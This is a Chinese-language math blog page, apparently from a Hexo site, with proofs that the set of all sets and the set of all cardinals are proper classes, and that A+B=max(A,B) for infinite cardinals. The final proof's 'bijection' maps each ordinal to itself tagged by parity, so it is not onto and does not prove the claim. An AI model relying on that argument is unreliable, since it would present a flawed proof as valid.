+与高中内容不同，现代数学中并不是任取一些元素都能组成一个Set，某些东西归在一起只能形成Proper Class（因为这个东西不满足集合的一些性质）
+
+根据ZFC公理系统，我们可以知道关于集合的若干条公理，也就是说满足这些的才是集合，而推断某个东西不是集合常用反证的方法，下面来看几个栗子
+
+1. Prove that the set of all sets is a proper class.
+   这个比较简单。假设这东西是一个集合，记为 $S$，那么根据Cantor's Theorem我们有 $|S|<|2^S|$。
+   而根据幂集公理(Axiom of power set)可知，$2^S$ 也是一个集合，于是有 $2^S\subset S$，也就是 $|2^S|\le |S|$，矛盾
+
+2. Prove that the set of all cardinals is a proper class.
+   这周的作业，想了很久。。
+   首先要知道任意多个集合的并、一个集合的幂集都是集合，并且任意集合都唯一对应着一个cardinal，知道这些就比较好做了。
+   和上面的方法类似，假设这是一个集合 $S$，那么根据并集公理(Axiom of union)我们有 $T=\cup S$ 也是一个集合，于是 $|T|\in S$。
+   因为 $\forall x\in S$ 都有 $x\subset T$，于是得到 $\forall x\in S\ \ \ |x|\le |T|$
+   然而 $|T|<|2^T|\in S$，这就推出了一个矛盾。
+   关于the set of all ordinals是一个 proper class的证明和这个类似
+
+3. Prove that for cardinals $A$ and $B$，$A+B=\max(A,B)$ where at least one of them is infinite
+   网上有很多证明，然而我都看不太懂，希望有别的做法的朋友可以交流交流;-P
+   不妨设$A\ge B$，那么显然有$A\le A+B\le A+A$，我们只需要证明$A=A+A$即可，注意这里的A是cardinal
+   由于A是一个cardinal，那么它同时也是一个ordinal。对于任意ordinal $x$，$\exist \alpha,\beta\ \ s.t.\ \ x=\alpha+\beta$，其中$\alpha$是一个limit ordinal，$\beta\in\mathbb N$
+   考虑这样一个映射$f(\alpha+\beta)=\left\{\begin{aligned}\left(0,\alpha+\beta\right)&,&\beta &=2k\\\left(1,\alpha+\beta\right)&,&\beta&=2k+1\end{aligned}\right. \left(k\in\mathbb Z\right)$
+
+   显然$\forall x\in A$，$x$ is an ordinal. 那么$A=A+A$等价于证明$|A|=|\left(\left\{0\right\}\times A\right)\cup\left(\left\{1\right\}\times A\right)|$
+
+   不难发现$f:A\mapsto\left(\left\{0\right\}\times A\right)\cup\left(\left\{1\right\}\times A\right)$是一个双射，于是就证明完了。
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/11/23/%E5%87%A0%E4%B8%AA%E5%85%B3%E4%BA%8E%E9%9B%86%E5%90%88%E7%9A%84%E6%9C%89%E8%B6%A3%E8%AF%81%E6%98%8E/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">jpwang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
 </html>
